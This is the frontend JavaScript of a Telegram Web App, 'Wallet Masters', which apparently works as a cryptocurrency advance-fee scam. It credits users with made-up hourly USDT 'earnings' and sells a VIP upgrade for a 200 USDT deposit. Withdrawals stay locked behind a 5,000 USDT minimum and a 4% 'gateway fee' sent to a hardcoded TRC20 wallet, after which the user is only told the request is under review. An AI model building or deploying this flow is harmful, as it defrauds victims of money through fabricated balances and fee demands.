/**
 * Wallet Masters — Frontend App v3
 */
const tg = window.Telegram.WebApp;
tg.ready(); tg.expand();

const FEE_ADDR = 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const API = window.location.origin + '/api';
const MIN_WD = 5000, MAX_WD = 50000;

let state = {
  user: null, balance: 0, trc20Address: '', uid: '',
  transactions: [], connections: [], earningApps: [],
  network: 'TRC20', withdrawType: 'crypto',
  pendingWithdrawal: null,
  hourlyStatus: { canClaim: false, nextClaimIn: 0, hourlyAmount: 50 },
  countdownTimer: null, balanceHidden: false, isVIP: false,
  supportMessages: []
};

// ── Init ──────────────────────────────────────────────────────────────────────
async function init() {
  try {
    const res = await fetch(`${API}/auth`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ initData: tg.initData || '', unsafeUser: tg.initDataUnsafe?.user || null })
    });
    const data = await res.json();
    if (!data.success) { showSplashError(data.error || 'Failed to load. Open via Telegram.'); return; }

    state.user         = data.user;
    state.balance      = data.user.balance || 0;
    state.trc20Address = data.user.trc20Address;
    state.uid          = data.user.uid;
    state.transactions = data.transactions || [];
    state.connections  = data.connections  || [];
    state.hourlyStatus = data.user.hourlyStatus || state.hourlyStatus;
    state.isVIP        = data.user.isVIP === true;

    updateUI();
    loadEarningApps();
    startCountdown();

    const splash = g('splash');
    splash.style.transition = 'opacity .5s';
    splash.style.opacity = '0';
    setTimeout(() => {
      splash.classList.add('hidden');
      g('app').classList.remove('hidden');
      generateQR(state.trc20Address);
    }, 500);
  } catch(e) {
    console.error(e);
    showSplashError('Connection error. Please try again.');
  }
}

function showSplashError(msg) {
  g('splash').innerHTML = `<div class="splash-inner"><div style="font-size:36px;margin-bottom:16px">!</div><h2 style="color:#f0f4ff;margin-bottom:8px">Load Failed</h2><p style="color:#7a90b0;padding:0 24px;text-align:center;font-size:13px">${msg}</p><button onclick="location.reload()" style="margin-top:24px;padding:12px 28px;background:#2563eb;color:#fff;border:none;border-radius:10px;font-size:14px;cursor:pointer;font-weight:600">Retry</button></div>`;
}

function g(id) {
  const el = document.getElementById(id);
  return el || { textContent:'',innerHTML:'',classList:{add:()=>{},remove:()=>{},toggle:()=>{},contains:()=>false},style:{},value:'',disabled:false };
}

// ── UI Update ─────────────────────────────────────────────────────────────────
function updateUI() {
  const u = state.user; if (!u) return;
  const name = u.name || u.username || 'User';
  g('userName').textContent  = name;
  g('userUID').textContent   = `UID: ${u.uid}`;
  g('userAvatar').textContent = name[0].toUpperCase();

  if (state.isVIP) {
    g('vipBadge').classList.remove('hidden');
    g('vipPromo').classList.add('hidden');
    g('withdrawTypeRow').classList.remove('hidden');
    g('earnTitle').textContent = 'VIP Earnings Active';
    g('earnSub').textContent   = 'Earn 200 USDT every hour';
  } else {
    g('vipBadge').classList.add('hidden');
    g('vipPromo').classList.remove('hidden');
    g('withdrawTypeRow').classList.add('hidden');
    g('earnTitle').textContent = 'Hourly Earnings Active';
    g('earnSub').textContent   = 'Earn 50 USDT every hour';
  }

  const bal = state.balance.toFixed(2);
  g('balanceAmount').textContent = state.balanceHidden ? '------' : bal;
  g('balanceUSD').textContent    = bal;
  g('usdtBalance').textContent   = bal;
  g('usdtValue').textContent     = `$${bal}`;
  g('trc20Address').textContent  = shortAddr(state.trc20Address);
  g('receiveAddress').textContent = state.trc20Address;
  g('receiveUID').textContent    = state.uid;
  g('availBalance').textContent  = bal;

  updateClaimBtn();
  renderTx(state.transactions, false);
}

function shortAddr(a) { return a ? a.slice(0,10) + '...' + a.slice(-6) : '---'; }
function toggleBalance() {
  state.balanceHidden = !state.balanceHidden;
  g('balanceAmount').textContent = state.balanceHidden ? '------' : state.balance.toFixed(2);
}

// ── Hourly ────────────────────────────────────────────────────────────────────
function updateClaimBtn() {
  const btn = g('claimHourlyBtn'), s = state.hourlyStatus;
  if (s.canClaim) {
    btn.textContent = `Claim ${s.hourlyAmount} USDT`; btn.disabled = false; btn.style.opacity = '1';
  } else {
    const m = Math.floor(s.nextClaimIn/60), sc = s.nextClaimIn%60;
    btn.textContent = `${m}m ${sc}s`; btn.disabled = true; btn.style.opacity = '.5';
  }
}
function startCountdown() {
  if (state.countdownTimer) clearInterval(state.countdownTimer);
  state.countdownTimer = setInterval(() => {
    if (state.hourlyStatus.nextClaimIn > 0) state.hourlyStatus.nextClaimIn--;
    if (state.hourlyStatus.nextClaimIn <= 0) state.hourlyStatus.canClaim = true;
    updateClaimBtn();
  }, 1000);
}
async function claimHourly() {
  if (!state.hourlyStatus.canClaim) return;
  const btn = g('claimHourlyBtn');
  btn.textContent = 'Processing...'; btn.disabled = true;
  try {
    const r = await post('/claim-hourly', {});
    if (r.success) {
      state.balance = r.newBalance;
      state.hourlyStatus = { canClaim: false, nextClaimIn: 3600, hourlyAmount: r.amount };
      state.transactions.unshift({ type:'earning', amount:r.amount, currency:'USDT', status:'completed', source_app: r.isVIP ? 'VIP Bonus' : 'Hourly Bonus', created_at: Math.floor(Date.now()/1000) });
      updateUI(); startCountdown(); toast(`+${r.amount} USDT Claimed`);
    } else { toast(r.error || 'Not ready'); const st = await post('/hourly-status',{}); state.hourlyStatus = st; updateClaimBtn(); startCountdown(); }
  } catch(e) { toast('Network error'); updateClaimBtn(); }
}

// ── VIP ───────────────────────────────────────────────────────────────────────
function showVIPUpgrade() { showPage('vip'); renderVIPPage(); }

function renderVIPPage() {
  g('vipPageContent').innerHTML = `
    <div class="vip-upgrade-card">
      <div class="vuc-header">
        <div class="vuc-crown">
          <svg width="32" height="32" fill="none" stroke="#f59e0b" stroke-width="1.8" viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
        </div>
        <h3>VIP Membership</h3>
        <p>One-time deposit to unlock lifetime VIP benefits</p>
      </div>
      <div class="vuc-benefits">
        <div class="vuc-benefit"><div class="vub-check">✓</div><div><div class="vub-title">200 USDT Every Hour</div><div class="vub-sub">4x more than standard (50 USDT/hr)</div></div></div>
        <div class="vuc-benefit"><div class="vub-check">✓</div><div><div class="vub-title">Bank &amp; Payment Withdrawal</div><div class="vub-sub">Withdraw directly to any bank or mobile money</div></div></div>
        <div class="vuc-benefit"><div class="vub-check">✓</div><div><div class="vub-title">Priority Support</div><div class="vub-sub">Get faster replies from the support team</div></div></div>
        <div class="vuc-benefit"><div class="vub-check">✓</div><div><div class="vub-title">VIP Member Badge</div><div class="vub-sub">Exclusive badge displayed on your profile</div></div></div>
      </div>
      <div class="vuc-steps">
        <div class="vuc-step-title">How to Upgrade</div>
        <div class="vuc-step"><span class="vus-num">1</span><span>Send exactly <strong>200 USDT</strong> on TRC20 to the address below</span></div>
        <div class="vuc-step"><span class="vus-num">2</span><span>Take a screenshot of your payment confirmation</span></div>
        <div class="vuc-step"><span class="vus-num">3</span><span>Submit the screenshot here — we verify and activate within minutes</span></div>
      </div>
      <div class="vuc-addr-box">
        <div class="vuc-addr-label">Send 200 USDT (TRC20) to:</div>
        <div class="vuc-addr">${state.trc20Address}</div>
        <button class="btn-outline w100" onclick="copyText('${state.trc20Address}');toast('Address copied')">Copy Address</button>
      </div>
      <div class="vuc-upload-section">
        <div class="vuc-upload-title">Submit Payment Receipt</div>
        <label class="upload-drop" for="vipReceiptFile">
          <svg width="26" height="26" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
          <span id="vipUploadLabel">Tap to upload payment screenshot</span>
          <input type="file" id="vipReceiptFile" accept="image/*" onchange="previewVIPReceipt(this)" style="display:none"/>
        </label>
        <img id="vipReceiptPreview" style="display:none;width:100%;border-radius:10px;margin-top:10px;max-height:200px;object-fit:contain"/>
      </div>
      <button id="submitVIPBtn" class="btn-primary w100" onclick="submitVIPReceipt()" disabled>Submit for VIP Activation</button>
    </div>`;
}

function previewVIPReceipt(input) {
  const file = input.files[0]; if (!file) return;
  const r = new FileReader();
  r.onload = e => {
    const img = g('vipReceiptPreview');
    img.src = e.target.result; img.style.display = 'block';
    g('vipUploadLabel').textContent = file.name;
    g('submitVIPBtn').disabled = false;
    document.querySelector('.upload-drop').style.borderColor = '#22c55e';
  };
  r.readAsDataURL(file);
}

async function submitVIPReceipt() {
  const fi = g('vipReceiptFile');
  if (!fi.files[0]) return toast('Please upload a receipt first');
  const btn = g('submitVIPBtn');
  btn.textContent = 'Submitting...'; btn.disabled = true;
  const reader = new FileReader();
  reader.onload = async e => {
    try {
      const res = await post('/vip-receipt', { receiptBase64: e.target.result, uid: state.uid });
      if (res.success) {
        g('vipPageContent').innerHTML = `<div style="text-align:center;padding:48px 20px"><div class="success-check">✓</div><h3 style="color:#22c55e;margin:16px 0 8px">Receipt Submitted</h3><p style="color:#7a90b0;font-size:13px">Your VIP upgrade request is under review.<br>You will be notified once approved.</p><button class="btn-primary mt12 w100" onclick="showPage('home')">Back to Home</button></div>`;
        toast('VIP receipt submitted!');
      } else { toast(res.error || 'Submission failed'); btn.textContent = 'Submit for VIP Activation'; btn.disabled = false; }
    } catch(e) { toast('Network error'); btn.textContent = 'Submit for VIP Activation'; btn.disabled = false; }
  };
  reader.readAsDataURL(fi.files[0]);
}

// ── Navigation ────────────────────────────────────────────────────────────────
function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.dataset.page === name));
  const page = g(`page-${name}`);
  if (page) {
    page.classList.add('active');
    if (name === 'receive')   generateQR(state.trc20Address);
    if (name === 'connect')   renderConnect();
    if (name === 'activity')  renderTx(state.transactions, true);
    if (name === 'support')   { loadSupportMessages(); scrollSupportToBottom(); }
    if (name === 'vip')       renderVIPPage();
  }
}

// ── Transactions ──────────────────────────────────────────────────────────────
function renderTx(txs, all) {
  const make = (list, full) => {
    if (!list?.length) return '<div class="empty-tx">No transactions yet</div>';
    return (full ? list : list.slice(0,5)).map(txHTML).join('');
  };
  g('txList').innerHTML   = make(txs, false);
  g('allTxList').innerHTML = make(txs, true);
}

function txHTML(tx) {
  const isIn = ['deposit','earning'].includes(tx.type);
  const sign = isIn ? '+' : '-';
  const dt   = new Date((tx.created_at||0)*1000);
  const date = dt.toLocaleDateString('en-US',{month:'short',day:'numeric'});
  const time = dt.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
  const src  = tx.source_app ? `<div class="tx-src">${tx.source_app}</div>` : '';
  const sCls = {completed:'st-done',approved:'st-done',rejected:'st-rejected',awaiting_fee:'st-pending',fee_paid:'st-review',pending:'st-pending',earning:'st-done'}[tx.status]||'st-pending';
  const sLbl = {completed:'Completed',approved:'Approved',rejected:'Rejected',awaiting_fee:'Awaiting Fee',fee_paid:'In Review',pending:'Pending',earning:'Completed'}[tx.status]||tx.status;
  const tLbl = {deposit:'Deposit',withdrawal:'Withdrawal',earning:tx.source_app||'Earnings'}[tx.type]||tx.type;
  return `<div class="tx-row" onclick="viewTxDetail(${tx.id})">
    <div class="tx-ico ${isIn?'tx-in':'tx-out'}">
      ${isIn?'<svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>':'<svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>'}
    </div>
    <div class="tx-info">
      <div class="tx-type">${tLbl}</div>${src}
      <div class="tx-date">${date} · ${time}</div>
    </div>
    <div class="tx-right">
      <div class="tx-amt ${isIn?'amt-in':'amt-out'}">${sign}${Number(tx.amount).toFixed(2)} ${tx.currency||'USDT'}</div>
      <div class="tx-status ${sCls}">${sLbl}</div>
    </div>
  </div>`;
}

function viewTxDetail(txId) {
  const tx = state.transactions.find(t => t.id === txId); if (!tx) return;
  const isIn = ['deposit','earning'].includes(tx.type);
  const sign = isIn ? '+' : '-';
  const dt   = new Date((tx.created_at||0)*1000).toLocaleString();
  const sCls = {completed:'st-done',approved:'st-done',rejected:'st-rejected',awaiting_fee:'st-pending',fee_paid:'st-review',pending:'st-pending',earning:'st-done'}[tx.status]||'st-pending';
  const sLbl = {completed:'Completed',approved:'Approved',rejected:'Rejected',awaiting_fee:'Awaiting Fee',fee_paid:'In Review',pending:'Pending',earning:'Completed'}[tx.status]||tx.status;
  g('txDetailContent').innerHTML = `
    <div class="tx-detail-card">
      <div class="tdc-top">
        <div class="tdc-ico ${isIn?'tx-in':'tx-out'}">${isIn?'<svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>':'<svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>'}</div>
        <div class="tdc-amt ${isIn?'amt-in':'amt-out'}">${sign}${Number(tx.amount).toFixed(2)} ${tx.currency||'USDT'}</div>
        <div class="tdc-status ${sCls}">${sLbl}</div>
      </div>
      <div class="tdc-rows">
        <div class="tdc-row"><span class="tdc-lbl">Type</span><span class="tdc-val">${(tx.type||'').charAt(0).toUpperCase()+(tx.type||'').slice(1)}</span></div>
        <div class="tdc-row"><span class="tdc-lbl">Date</span><span class="tdc-val">${dt}</span></div>
        ${tx.tx_hash?`<div class="tdc-row"><span class="tdc-lbl">TX Hash</span><span class="tdc-val tdc-mono">${tx.tx_hash.slice(0,20)}...</span></div>`:''}
        ${tx.to_address?`<div class="tdc-row"><span class="tdc-lbl">To Address</span><span class="tdc-val tdc-mono">${tx.to_address.slice(0,16)}...</span></div>`:''}
        ${tx.source_app?`<div class="tdc-row"><span class="tdc-lbl">Source</span><span class="tdc-val">${tx.source_app}</span></div>`:''}
        <div class="tdc-row"><span class="tdc-lbl">Network</span><span class="tdc-val">${tx.network||'TRC20'}</span></div>
        ${tx.gateway_fee?`<div class="tdc-row"><span class="tdc-lbl">Gateway Fee</span><span class="tdc-val">${tx.gateway_fee} USDT</span></div>`:''}
        ${tx.bank_name?`<div class="tdc-row"><span class="tdc-lbl">Bank</span><span class="tdc-val">${tx.bank_name}</span></div>`:''}
        ${tx.account_number?`<div class="tdc-row"><span class="tdc-lbl">Account No.</span><span class="tdc-val">${tx.account_number}</span></div>`:''}
        <div class="tdc-row"><span class="tdc-lbl">Transaction ID</span><span class="tdc-val">#${tx.id}</span></div>
      </div>
      <button class="btn-outline w100 mt12" onclick="showPage('activity')">Back to History</button>
    </div>`;
  showPage('tx-detail');
}

// ── Withdrawal ────────────────────────────────────────────────────────────────
function setWithdrawType(t) {
  state.withdrawType = t;
  g('btnCrypto').classList.toggle('active', t==='crypto');
  g('btnBank').classList.toggle('active', t==='bank');
  g('cryptoFields').classList.toggle('hidden', t==='bank');
  g('bankFields').classList.toggle('hidden', t==='crypto');
  onWithdrawInput();
}
function selectNetwork(el) {
  document.querySelectorAll('.net-opt').forEach(o=>o.classList.remove('active'));
  el.classList.add('active'); state.network = el.dataset.n;
}
function resetWithdrawForm() {
  ['withdrawAddress','withdrawAmount','bankAccount','bankName'].forEach(f=>{ const el=g(f); if(el) el.value=''; });
  const pm=g('paymentMethod'); if(pm) pm.value='';
  updateFees(); setWithdrawType(state.isVIP ? state.withdrawType : 'crypto');
}
function onWithdrawInput() { updateFees(); validateWithdraw(); }
function validateWithdraw() {
  const amt = parseFloat(g('withdrawAmount').value)||0;
  let valid = amt>=MIN_WD && amt<=MAX_WD && amt<=state.balance;
  if (state.withdrawType==='crypto') valid = valid && (g('withdrawAddress').value||'').trim().length>=20;
  else valid = valid && (g('bankAccount').value||'').trim().length>3 && (g('bankName').value||'').trim().length>2 && (g('paymentMethod').value||'').length>0;
  g('withdrawBtn').disabled = !valid;
}
function updateFees() {
  const amt=parseFloat(g('withdrawAmount').value)||0, gf=parseFloat((amt*0.04).toFixed(2));
  g('feeAmt').textContent=`${amt.toFixed(2)} USDT`;
  g('gatewayFeeDisplay').textContent=`${gf.toFixed(2)} USDT`;
  g('totalFeeDisplay').textContent=`${gf.toFixed(2)} USDT`;
  validateWithdraw();
}
function setPct(p) { g('withdrawAmount').value=(state.balance*p/100).toFixed(2); updateFees(); }
async function submitWithdrawal() {
  const amt=parseFloat(g('withdrawAmount').value), btn=g('withdrawBtn');
  const isBankWD=state.withdrawType==='bank';
  const payload={amount:amt,currency:'USDT',network:state.network,isBankWithdrawal:isBankWD,
    toAddress:isBankWD?'':(g('withdrawAddress').value||'').trim(),
    bankName:isBankWD?(g('paymentMethod').value||''):null,
    accountNumber:isBankWD?(g('bankAccount').value||'').trim():null,
    accountName:isBankWD?(g('bankName').value||'').trim():null,
    paymentMethod:isBankWD?(g('paymentMethod').value||''):null};
  btn.textContent='Processing...'; btn.disabled=true;
  try {
    const r=await post('/withdraw',payload);
    btn.textContent='Continue to Payment'; btn.disabled=false;
    if(!r.success) return toast('Error: '+(r.error||'Unknown'));
    state.pendingWithdrawal=r.withdrawal;
    showFeePayPage(r.withdrawal, isBankWD, payload);
  } catch(e){ toast('Network error'); btn.textContent='Continue to Payment'; btn.disabled=false; }
}
function showFeePayPage(wd,isBankWD,payload) {
  const dest=isBankWD?`${payload.bankName} · ${payload.accountNumber} · ${payload.accountName}`:wd.toAddress;
  const refId='WM-'+Date.now().toString(36).toUpperCase();
  g('feePayBox').innerHTML=`
    <div class="fee-pay-card">
      <div class="fpc-header">
        <div class="fpc-icon"><svg width="26" height="26" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M12 20V4m-8 8l8-8 8 8"/></svg></div>
        <h3>Pay Gateway Fee</h3><p>Complete payment to process your withdrawal</p>
      </div>
      <div class="fpc-details">
        <div class="fpc-row"><span>Reference ID</span><span class="fpc-ref">${refId}</span></div>
        <div class="fpc-row"><span>Amount</span><span>${Number(wd.amount).toFixed(2)} USDT</span></div>
        <div class="fpc-row"><span>Destination</span><span class="fpc-dest">${dest}</span></div>
        <div class="fpc-row"><span>Network</span><span>${wd.network||'TRC20'}</span></div>
        <div class="fpc-row fpc-fee"><span>Gateway Fee (4%)</span><span class="fpc-fee-val">${Number(wd.gatewayFee||wd.totalFee).toFixed(2)} USDT</span></div>
      </div>
      <div class="fpc-pay-section">
        <div class="fpc-pay-label">Send fee to this TRC20 address:</div>
        <div class="fpc-pay-addr-box">
          <span class="fpc-pay-addr">${FEE_ADDR}</span>
          <button class="copy-mini-btn" onclick="copyText('${FEE_ADDR}');toast('Copied')">Copy</button>
        </div>
        <div class="fpc-pay-note">Send exactly <strong>${Number(wd.gatewayFee||wd.totalFee).toFixed(2)} USDT</strong> on TRC20 only</div>
      </div>
      <div class="fpc-upload-section">
        <div class="fpc-upload-label">Upload Payment Receipt</div>
        <label class="upload-drop" for="receiptFile">
          <svg width="26" height="26" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
          <span id="uploadLabel">Tap to upload screenshot</span>
          <input type="file" id="receiptFile" accept="image/*" onchange="previewReceipt(this)" style="display:none"/>
        </label>
        <img id="receiptPreview" style="display:none;width:100%;border-radius:10px;margin-top:10px;max-height:200px;object-fit:contain"/>
      </div>
      <button class="btn-primary w100" id="submitReceiptBtn" onclick="submitReceipt(${wd.id})" disabled>Submit Receipt for Review</button>
      <button class="btn-outline w100 mt12" onclick="showPage('withdraw')">Back</button>
    </div>`;
  showPage('fee-pay');
}
function previewReceipt(input) {
  const file=input.files[0]; if(!file) return;
  const r=new FileReader();
  r.onload=e=>{ const img=g('receiptPreview'); img.src=e.target.result; img.style.display='block'; g('uploadLabel').textContent=file.name; document.querySelector('.upload-drop').style.borderColor='#22c55e'; g('submitReceiptBtn').disabled=false; };
  r.readAsDataURL(file);
}
async function submitReceipt(wrId) {
  const fi=g('receiptFile'), btn=g('submitReceiptBtn');
  if(!fi?.files[0]) return toast('Please upload a receipt');
  btn.textContent='Submitting...'; btn.disabled=true;
  const r=new FileReader();
  r.onload=async e=>{
    const res=await post('/receipt',{withdrawalId:wrId,receiptBase64:e.target.result});
    if(res.success){ toast('Receipt submitted!'); g('feePayBox').innerHTML=`<div style="text-align:center;padding:48px 20px"><div class="success-check">✓</div><h3 style="color:#22c55e;margin:16px 0 8px">Receipt Submitted</h3><p style="color:#7a90b0;font-size:13px">Your withdrawal is under review.<br>You will be notified once approved.</p><button class="btn-primary mt12 w100" onclick="showPage('home')">Back to Home</button></div>`; state.pendingWithdrawal=null; }
    else{ toast('Error: '+(res.error||'Failed')); btn.textContent='Submit Receipt for Review'; btn.disabled=false; }
  };
  r.readAsDataURL(fi.files[0]);
}

// ── QR Code ───────────────────────────────────────────────────────────────────
function generateQR(text) {
  const c=g('qrCanvas'); if(!c||!text) return; c.innerHTML='';
  try { new QRCode(c,{text,width:200,height:200,colorDark:'#000',colorLight:'#fff',correctLevel:QRCode.CorrectLevel.M}); }
  catch(e){ c.innerHTML=`<div style="padding:16px;word-break:break-all;font-size:10px">${text}</div>`; }
}

// ── Connect ───────────────────────────────────────────────────────────────────
function renderConnect() {
  const grid=g('appsGrid');
  if(!state.earningApps.length){ grid.innerHTML='<div class="empty-tx">No apps available yet</div>'; return; }
  grid.innerHTML=state.earningApps.map(app=>`
    <div class="app-card" onclick="openModal(${app.id},'${app.name.replace(/'/g,"\\'")}')">
      <div class="app-logo">${app.name[0].toUpperCase()}</div>
      <div class="app-info"><div class="app-name">${app.name}</div><div class="app-desc">${app.description||'Earning App'}</div></div>
      <div class="app-status ${isConnected(app.id)?'connected':''}">${isConnected(app.id)?'Connected':'Connect'}</div>
    </div>`).join('');
}
function isConnected(appId){ return state.connections.some(c=>c.app_id===appId); }
async function loadEarningApps() { try{ const r=await fetch(`${API}/apps`); state.earningApps=await r.json(); }catch(e){} }
let _connectAppId=null;
function openModal(appId,appName){ _connectAppId=appId; g('modalTitle').textContent=`Connect to ${appName}`; g('modalUID').value=''; g('uidErr').classList.add('hidden'); g('connectModal').classList.remove('hidden'); setTimeout(()=>g('modalUID').focus(),100); }
function closeModal(){ g('connectModal').classList.add('hidden'); _connectAppId=null; }
async function submitUID() {
  const uid=(g('modalUID').value||'').trim(), err=g('uidErr'), btn=g('connectBtn');
  if(!uid||uid.length<3){ err.textContent='Please enter a valid UID'; err.classList.remove('hidden'); return; }
  err.classList.add('hidden'); btn.textContent='Connecting...'; btn.disabled=true;
  const r=await fetch(`${API}/connect-uid`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({telegram_id:state.user?.telegramId,app_id:_connectAppId,external_uid:uid})}).then(r=>r.json());
  btn.textContent='Connect Wallet'; btn.disabled=false;
  if(r.success){ toast('UID Connected'); closeModal(); const ar=await post('/auth',{}); if(ar.success){state.connections=ar.connections||[];renderConnect();} }
  else{ err.textContent='Invalid UID. Check and try again.'; err.classList.remove('hidden'); }
}

// ── Support ───────────────────────────────────────────────────────────────────
async function loadSupportMessages() {
  try {
    const r = await post('/support/messages', {});
    if (r.success) {
      state.supportMessages = r.messages || [];
      renderSupportMessages(state.supportMessages);
    }
  } catch(e) { console.error(e); }
}

function renderSupportMessages(msgs) {
  const box = g('supportMessages');
  if (!msgs?.length) {
    box.innerHTML = `<div class="support-empty">
      <svg width="40" height="40" fill="none" stroke="#7a90b0" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
      <p>Send a message to our Support Team.<br>We typically reply within a few hours.</p>
    </div>`;
    return;
  }
  box.innerHTML = msgs.map(m => {
    const isAdmin = m.sender === 'admin';
    const dt = new Date((m.created_at||0)*1000).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
    return `<div class="msg-row ${isAdmin?'msg-admin':'msg-user'}">
      ${isAdmin?'<div class="msg-sender">Support Team</div>':''}
      <div class="msg-bubble">${escHtml(m.message)}</div>
      <div class="msg-time">${dt}</div>
    </div>`;
  }).join('');
  scrollSupportToBottom();
}

function scrollSupportToBottom() {
  setTimeout(() => { const b=g('supportMessages'); b.scrollTop=b.scrollHeight; }, 100);
}

function escHtml(t) { return (t||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

async function sendSupportMsg() {
  const input = g('supportInput');
  const msg = (input.value||'').trim();
  if (!msg) return;
  // Optimistically show message
  state.supportMessages.push({ sender:'user', message:msg, created_at: Math.floor(Date.now()/1000) });
  renderSupportMessages(state.supportMessages);
  input.value = '';
  try {
    const r = await post('/support/send', { message: msg });
    if (!r.success) { toast(r.error||'Failed to send'); }
    // Reload to get server-confirmed messages
    await loadSupportMessages();
  } catch(e) { toast('Network error'); }
}

// ── Helpers ───────────────────────────────────────────────────────────────────
async function post(endpoint, extra) {
  const res = await fetch(`${API}${endpoint}`, {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ initData: tg.initData||'', unsafeUser: tg.initDataUnsafe?.user||null, ...extra })
  });
  return res.json();
}
function copyAddress(){ copyText(state.trc20Address); toast('Address copied'); }
function copyUID()    { copyText(state.uid);           toast('UID copied'); }
function copyText(t) {
  if(navigator.clipboard) navigator.clipboard.writeText(t).catch(()=>{});
  else{ const el=document.createElement('textarea'); el.value=t; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el); }
}
let _toastT;
function toast(msg) {
  let t=document.getElementById('_toast');
  if(!t){ t=document.createElement('div'); t.id='_toast'; t.style.cssText='position:fixed;bottom:82px;left:50%;transform:translateX(-50%);background:#0e1629;color:#f0f4ff;padding:10px 20px;border-radius:8px;font-size:13px;z-index:9999;pointer-events:none;max-width:80vw;text-align:center;transition:opacity .3s;border:1px solid #1e2d45;box-shadow:0 4px 20px rgba(0,0,0,.5)'; document.body.appendChild(t); }
  t.textContent=msg; t.style.opacity='1';
  if(_toastT) clearTimeout(_toastT);
  _toastT=setTimeout(()=>t.style.opacity='0',2800);
}
window.addEventListener('DOMContentLoaded', init);
